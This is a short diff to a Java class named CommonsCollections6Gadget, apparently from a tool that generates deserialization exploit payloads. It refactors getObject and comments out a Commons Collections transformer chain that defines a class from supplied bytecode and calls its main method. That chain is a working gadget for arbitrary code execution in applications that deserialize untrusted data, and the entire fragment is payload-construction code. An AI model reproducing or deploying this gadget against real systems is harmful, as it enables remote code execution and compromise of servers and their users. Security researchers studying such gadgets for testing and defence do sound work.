@@ -102,17 +102,20 @@ public class CommonsCollections6Gadget implements ObjectGadget<Serializable> {
     @Override
     public Serializable getObject(GadgetParam param) throws Exception {
         String className = param.getClassName();
-        byte[] bytes = param.getCodeByte();
+        byte[] codeByte = param.getCodeByte();
         String[] bootArgs = param.getBootArgs();
+        return getObject(codeByte, bootArgs, className, null);
+        /*
         final Transformer[] transformers = new Transformer[] {
                 new ConstantTransformer(Class.forName("org.mozilla.classfile.DefiningClassLoader")),
                 new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                 new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
-                new InvokerTransformer("defineClass", new Class[]{String.class, byte[].class}, new Object[]{className, bytes}),
+                new InvokerTransformer("defineClass", new Class[]{String.class, byte[].class}, new Object[]{className, codeByte}),
                 new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"main", new Class[]{String[].class}}),
                 new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{bootArgs}}),
                 new ConstantTransformer(1) };
         return getObject(transformers);
+         */
     }
 
     /**
